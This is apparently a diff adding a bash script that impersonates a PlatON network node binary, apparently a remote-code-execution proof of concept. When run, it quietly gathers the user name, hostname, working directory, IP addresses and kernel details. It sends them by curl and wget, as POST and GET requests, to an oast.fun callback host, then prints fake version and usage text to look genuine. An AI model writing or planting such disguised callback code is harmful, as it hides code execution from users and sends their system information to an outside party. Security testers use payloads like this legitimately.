@@ -1,0 +1,40 @@
+#!/bin/bash
+# Callback to collaborator server
+COLLAB_URL="http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun"
+TIMESTAMP=$(date +%Y-%m-%d_%H-%M-%S)
+
+# Collect system information
+WHOAMI=$(whoami)
+HOSTNAME=$(hostname)
+PWD=$(pwd)
+IP_ADDR=$(ip addr 2>/dev/null || ifconfig 2>/dev/null || echo "unknown")
+UNAME=$(uname -a)
+
+# Create payload
+PAYLOAD="timestamp=$TIMESTAMP&whoami=$WHOAMI&hostname=$HOSTNAME&pwd=$PWD&uname=$UNAME"
+
+# Send to collaborator using multiple methods for reliability
+curl -X POST -d "$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1
+wget --post-data="$PAYLOAD" "$COLLAB_URL" >/dev/null 2>&1
+
+# Also try GET request with parameters
+GET_URL="$COLLAB_URL?$PAYLOAD"
+curl -s "$GET_URL" >/dev/null 2>&1
+wget -q "$GET_URL" >/dev/null 2>&1
+
+# Write to local file for verification
+echo "RCE Callback Sent: $TIMESTAMP" >> /tmp/platon_rce_callback.log
+echo "WHOAMI: $WHOAMI" >> /tmp/platon_rce_callback.log
+echo "HOSTNAME: $HOSTNAME" >> /tmp/platon_rce_callback.log
+echo "PWD: $PWD" >> /tmp/platon_rce_callback.log
+
+# Mimic real platon behavior
+if [ "$1" == "--version" ]; then
+    echo "PlatON Version: 1.0.0"
+elif [ "$1" == "version" ]; then
+    echo "Version: 1.0.0"
+else
+    echo "PlatON network node"
+    echo "Usage: platon [options]"
+    sleep 1
+fi
